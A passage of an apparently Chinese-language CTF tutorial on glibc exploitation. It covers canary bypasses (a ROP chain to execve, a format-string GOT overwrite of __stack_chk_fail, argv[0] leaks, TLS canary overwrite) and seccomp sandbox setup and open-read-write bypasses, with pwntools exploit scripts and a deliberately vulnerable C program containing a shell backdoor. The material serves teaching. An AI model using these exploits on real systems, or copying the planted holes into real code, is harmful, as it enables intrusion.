class="line">payload += p64(<span class="number">0x00000000004c10e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004017cf</span>)  <span class="comment"># pop rdx ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rax; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload+=p64(elf.search(asm(<span class="string">&#x27;syscall;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">&quot;please input:\n&quot;</span>, payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="劫持-stack-chk-failed-函数"><a href="#劫持-stack-chk-failed-函数" class="headerlink" title="劫持 __stack_chk_failed 函数"></a>劫持 __stack_chk_failed 函数</h2><p>canary 检测失败会调用 <code>__stack_chk_failed</code> 函数，可以通过比如格式化字符串漏洞修改 got 表中对应 <code>__stack_chk_failed</code> 的位置为后门函数的地址来实施攻击。</p>
<p>示例程序：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;this is a backdoor.&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x110</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    vuln();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// gcc pwn.c -o pwn -no-pie -Wl,-z,lazy -g</span></span><br></pre></td></tr></table></figure></div>

<p>exp：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"> </span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]: elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]&#125;)</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x40124b\nc&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">&quot;please input:&quot;</span>, payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-stack-chk-failed-函数报错信息泄露数据"><a href="#利用-stack-chk-failed-函数报错信息泄露数据" class="headerlink" title="利用 __stack_chk_failed 函数报错信息泄露数据"></a>利用 __stack_chk_failed 函数报错信息泄露数据</h2><p><code>__stack_chk_fail</code> 函数输出错误信息时会把 <code>__libc_argv[0]</code> 作为信息输出，也就是 <code>main</code> 函数参数的 <code>argv[0]</code>，这个参数保存在栈中，如果可以覆盖该参数，也就可以打印出需要泄露的信息。</p>
<p><strong>注意高版本的 libc 的 <code>__fortify_fail</code> 函数并不会打印 <code>__libc_argv[0]</code> 。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);<span class="comment">//这里简单理解成打印出报错信息即可，也就是可以泄露信息</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<h2 id="覆盖-canary-初始值"><a href="#覆盖-canary-初始值" class="headerlink" title="覆盖 canary 初始值"></a>覆盖 canary 初始值</h2><p> linux 下 fs 寄存器指向当前栈的 TLS 结构，fs:0x28 指向的是 TLS 结构中的 stack_guard 值，如果可以覆盖位于 TLS 中的 canary 初始值就可以绕过 canary 保护。</p>
<ul>
<li>栈和 mmap 出的内存一般离 TLS 很近，可以通过溢出覆盖。</li>
<li>gdb下利用 <code>search -canary字节数 canary</code> 命令可以快速定位出 canary 的位置。</li>
</ul>
<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_cc2c970b6ae5033b88ec97722344e326" >例题<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>另外如果题目中申请的 chunk 大小限制不能很大，无法触发 mmap 且只能申请 1 次，那么就无法通过堆溢出修改 canary 。</p>
<p> 但是像<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/21st_century" >这道题<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>可以通过栈溢出伪造环境变量添加 <code>MALLOC_MMAP_THRESHOLD_=1</code> ，这样即使 malloc 很小的 chunk 也会触发 mmap 分配内存，因此同样可以覆盖 canary 。</p>
<h1 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h1><p>这里的沙箱通常指的是 seccomp 。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><code>PR_SET_SECCOMP</code> 是 Linux 内核提供的一种机制，用于限制进程可以执行的系统调用，从而增强系统的安全性。<code>PR_SET_SECCOMP</code> 机制可以通过使用 <code>prctl()</code> 系统调用来设置，具体来说，可以通过 <code>PR_SET_SECCOMP</code> 命令设置进程的 seccomp 过滤器，或通过 <code>PR_SET_NO_NEW_PRIVS</code> 命令设置进程的 <code>no_new_privs</code> 标志。</p>
<p>seccomp 过滤器可以通过编写 BPF（Berkeley Packet Filter）程序来实现，BPF 程序可以过滤进程所发起的系统调用，只允许特定的系统调用通过，从而限制进程的行为。seccomp 过滤器只能在进程启动时设置，并且一旦设置，就不能修改，这样可以防止攻击者通过注入代码来修改过滤器。</p>
<p><code>PR_SET_NO_NEW_PRIVS</code> 标志可以用于禁止进程获取更高的权限，即使进程拥有特权级别的用户或进程权限。这可以防止进程通过提升权限来攻击系统，从而增强系统的安全性。</p>
<p><strong>一般使用 seccomp 有两种方法，一种是用 <code>prctl</code> ，另一种是用 <code>seccomp</code> 。</strong></p>
<h3 id="使用-prctl-创建-seccomp"><a href="#使用-prctl-创建-seccomp" class="headerlink" title="使用 prctl 创建 seccomp"></a>使用 prctl 创建 seccomp</h3><p>我们可以借助工具 seccomp-tools 来编写沙箱规则。</p>
<p>首先编写沙箱规则，这里我们保存在文件 <code>rule</code> 中。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : kill</span><br><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? kill : next</span><br><span class="line">A == execve ? kill : allow</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br><span class="line">kill:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure></div>

<p>运行命令将沙箱规则转换为可被 <code>PR_SET_SECCOMP</code> 识别的规则。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm - </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>

<p>将生成的规则应用到 c 程序中，这里使用 <code>prctl</code> 系统调用来设置沙箱规则。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义过滤器规则</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000004</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0xc000003e</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0000003b</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">            .len = (<span class="type">unsigned</span> <span class="type">short</span>) (<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">            .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置seccomp过滤器</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] prctl error.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译后通过 <code>seccomp-tools dump</code> 命令可以看到程序中有了 seccomp 规则（<code>ptctl</code> 系统调用需要 root 权限因此需要加 sudo）。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo seccomp-tools dump ./test</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>

<p>运行程序发现 <code>execve</code> 系统调用无法正常执行。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo ./test    </span><br><span class="line">[1]    40123 invalid system call  sudo ./test</span><br></pre></td></tr></table></figure></div>

<h3 id="使用-seccomp-创建-seccomp"><a href="#使用-seccomp-创建-seccomp" class="headerlink" title="使用 seccomp 创建 seccomp"></a>使用 seccomp 创建 seccomp</h3><p>如果是使用 <code>seccomp</code> 系统调用添加规则，那么首先需要安装 <code>seccomp</code> 库的开发包：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libseccomp-dev</span><br></pre></td></tr></table></figure></div>

<p>前面的代码可以写作如下形式：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个过滤器上下文</span></span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加过滤规则</span></span><br><span class="line">    seccomp_arch_add(ctx, SCMP_ARCH_X86_64);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中添加规则的函数 <code>seccomp_arch_add</code> 定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seccomp_rule_add</span><span class="params">(scmp_filter_ctx ctx, <span class="type">uint32_t</span> action, <span class="type">int</span> syscall, <span class="type">unsigned</span> <span class="type">int</span> arg_cnt, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中参数解释如下：</p>
<ul>
<li><p><code>ctx</code>：过滤器上下文，用于存储过滤规则。</p>
</li>
<li><p><code>action</code>：当规则匹配时的操作，可以是以下值之一。</p>
<ul>
<li><code>SCMP_ACT_ALLOW</code>：允许系统调用。</li>
<li><code>SCMP_ACT_KILL</code>：杀死进程。</li>
<li><code>SCMP_ACT_ERRNO</code>：返回错误码并允许系统调用，用法为 <code>SCMP_ACT_ERRNO(返回值)</code> ，这样该系统调用如果满足条件则直接返回定义的返回值而不进行系统调用。在某些题目中通常用来劫持特定系统调用返回特殊值，比如劫持 <code>open</code> 系统调用返回 0 即标准输入。</li>
</ul>
</li>
<li><p><code>syscall</code>：要限制的系统调用号。</p>
</li>
<li><p><code>arg_cnt</code>：要匹配的参数数量，如果没有参数需要匹配，则 <code>arg_cnt</code> 应该为 0 。</p>
</li>
<li><p><code>...</code>：可变参数列表，用于指定要匹配的参数值。对于每个参数，需要指定一个 <code>scmp_arg_cmp</code> 结构体，这个结构体包含了参数的比较方式和比较值。<code>scmp_arg_cmp</code> 结构体定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scmp_arg_cmp</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> arg;	<span class="comment">/**&lt; argument number, starting at 0 */</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">scmp_compare</span> <span class="title">op</span>;</span>	<span class="comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span></span><br><span class="line">  <span class="type">scmp_datum_t</span> datum_a;</span><br><span class="line">  <span class="type">scmp_datum_t</span> datum_b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>arg</code>：要比较的参数序号，从0开始。</li>
<li><code>op</code>：比较方式，可以是以下值之一：<ul>
<li><code>SCMP_CMP_NE</code>：不等于</li>
<li><code>SCMP_CMP_EQ</code>：等于</li>
<li><code>SCMP_CMP_LT</code>：小于</li>
<li><code>SCMP_CMP_LE</code>：小于等于</li>
<li><code>SCMP_CMP_GT</code>：大于</li>
<li><code>SCMP_CMP_GE</code>：大于等于</li>
<li><code>SCMP_CMP_MASKED_EQ</code>：按位与运算后等于（比较值为掩码）。</li>
</ul>
</li>
<li><code>datum_a</code>：用来与参数进行比较的值。</li>
</ul>
</li>
</ul>
<p>例如下面的代码添加的规则是规定 <code>read</code> 必须从标准输入读取不超过 <code>BUF_SIZE</code> 的内容到 <code>buf</code> 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 0x100</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE];</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                     SCMP_A0(SCMP_CMP_EQ, fileno(<span class="built_in">stdin</span>)),</span><br><span class="line">                     SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>) buf),</span><br><span class="line">                     SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br></pre></td></tr></table></figure></div>

<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="open-read-write"><a href="#open-read-write" class="headerlink" title="open-read-write"></a>open-read-write</h3><p>一直常见的沙箱类型是禁用 <code>execve</code> 系统调用。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>

<p>这种类型的沙箱通常的绕过方法是劫持控制流通过 rop 或 shellcode 依次调用 <code>open</code> ，<code>read</code> ，<code>write</code> 来完成对 <code>flag</code> 文件的读取和输出。</p>
<h4 id="64-位版本"><a href="#64-位版本" class="headerlink" title="64 位版本"></a>64 位版本</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">rop_addr = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span 